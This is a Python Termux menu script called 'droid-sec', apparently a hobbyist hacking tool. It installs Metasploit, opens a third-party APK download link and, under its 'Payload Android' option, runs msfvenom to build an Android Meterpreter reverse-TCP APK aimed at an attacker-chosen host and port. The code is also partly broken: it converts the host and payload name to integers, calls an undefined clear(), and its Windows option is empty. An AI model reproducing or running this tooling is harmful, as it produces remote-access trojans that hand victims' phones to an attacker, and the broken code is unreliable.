

from os import *
from sys import *
from time import *
###		    colors
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
C='\033[1;36m'
W='\033[1;37m'
####	            banner
system('clear')
print(R +"""
____     ___            ____   ___                      
`MM`    `MM'           6MMMMb/ `MM                      
 MM      MM           8P    YM  MM                      
 MM      MM\033[1;32m    ___\033[1;31m   6M      Y  MM   __\033[1;32m   ____ \033[1;31m ___  __ 
 MM      MM\033[1;32m  6MMMMb\033[1;31m  MM         MM   d' \033[1;32m 6MMMMb \033[1;31m`MM 6MM 
 MMMMMMMMMM\033[1;32m 8M`  `Mb\033[1;31m MM         MM  d`  \033[1;32m6M'  `Mb\033[1;31m MM69 " 
 MM      MM\033[1;32m     ,oMM\033[1;31m MM         MM d`   \033[1;32mMM    MM \033[1;31mMM'    
 MM      MM\033[1;32m ,6MM9'MM\033[1;31m MM         MMdM.  \033[0;32m MMMMMMMM \033[1;31mMM     
 MM      MM\033[1;32m MM'   MM\033[1;31m YM      6  MMPYM.  \033[1;32mMM       \033[1;31mMM     
 MM      MM\033[1;32m MM.  ,MM\033[1;31m  8b    d9  MM  YM. \033[1;32mYM    d9 \033[1;31mMM     
_MM_    _MM\033[1;32m_`YMMM9'Yb.\033[1;31m YMMMM9  _MM_  YM._\033[1;32mYMMMM9 \033[1;31m_MM_    
\033[1;32m	    ╔╦╗┬─┐┌─┐┬┌┬┐   ╔═╗┌─┐┌─┐
	     ║║├┬┘│ ││ ││\033[1;31m───\033[1;32m╚═╗├┤ │  
	    ═╩╝┴└─└─┘┴─┴┘   ╚═╝└─┘└─┘
""")
print(R +"*"*54)
print( G +"["+ R +"1" + G +"]"+ C +"=="+ G +"["+ Y +"Install Metasploit"+ G +"]")
system('sleep 0.1')
print( G +"["+ R +"2" + G +"]"+ C +"=="+ G +"["+ Y +"Install App Port  "+ G +"]")
system('sleep 0.1')
print( G +"["+ R +"3" + G +"]"+ C +"=="+ G +"["+ Y +"Check Port Open   "+ G +"]")
system('sleep 0.1')
print( G +"["+ R +"4" + G +"]"+ C +"=="+ G +"["+ Y +"Payload Android   "+ G +"]")
system('sleep 0.1')
print( G +"["+ R +"5" + G +"]"+ C +"=="+ G +"["+ Y +"Payload Windows   "+ G +"]")
system('sleep 0.1')
print( G +"["+ R +"6" + G +"]"+ C +"=="+ G +"["+ Y +"About "+ G +"            ]")
system('sleep 0.1')
print( G +"["+ R +"0" + G +"]"+ C +"=="+ G +"["+ Y +"Exit program      "+ G +"]")

print(" ")

droid=str(input(C +"               ●~>Enter Number ~》 "+ R))

if droid=="1":
    system('clear')
    print(Y +"    {+\+\+\+ Install Now MetaSploit +/+/+/+}")
    system('sleep 1')
    system('pkg install unstable-repo -y')
    system('pkg install metasploit -y')
    system('clear')
    print(G +"            ^_^ ...... Thank You Down")
    print(C +"Please Open New Session and Enter") 
    print(C +"                         The command---"+ Y +"{ "+ W +"msfconsole "+ Y +"}")
    print(" ")
    print(R +"*"*54)
    print(" ")
    print(" ")
    input(G +"Enter BaCk... ")
    system('python droid-sec.py')
elif droid=="2":
    system('clear')
    print(G +"Downloading ...... ")
    system('termux-open https://download844.mediafire.com/839hbkedq6kg/hqqdm6u76ol4mve/Port+Forwarder_v6.1_apkpure.com.apk')
    system('clear')
    print("Please Go /sdcard/Download "+ Y +"Install App")
    print(R +"*"*54)

    input(G +"Enter BaCk... ")
    system('python droid-sec.py')

elif droid=="3":
    print("         please Go URL")
    sleep(2)
    system('termux-open https://canyouseeme.org/')
    system('')
    print(R +"*"*54)
    print(" ")
    print(" ")
    input(G +"Enter BaCk... ")
    system('python droid-sec.py')
elif droid=="4":
    system('clear')
    lhost=int(input("Enter LHOST: "))
    lport=int(input("Enter LPORT: "))
    name=int(input("Enter Payload Name: "))
    system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > /sdcard/%s.apk"%(lhost,lport,name))
    clear()
    print("    Please Go /sdcard")
    print(R +"*"*54)
    print(" ")
    input(G +"Enter BaCk... ")
    system('python droid-sec.py')
elif droid=="5":
    system('clear')
    print(R +"*"*54)
    print(" ")
    print(" ")
    input(G +"Enter BaCk... ")
    system('python droid-sec.py')
elif droid=="6":
    system('clear')
    print(R +"*"*54) 
    print(" ")
    print(" ") 
    input(G +"Enter BaCk... ")
    system('python droid-sec.py')
elif droid=="0":
    system('clear')
    print(R +"Good Bay Frind Please No forget subscribe my channel ^_•")
    exit()
else:
	system('clear')
	print(R +"Error  "*100)
	print(Y +"Please Enter Number Successful ^_^")
	sleep(3)
	system('python droid-sec.py')
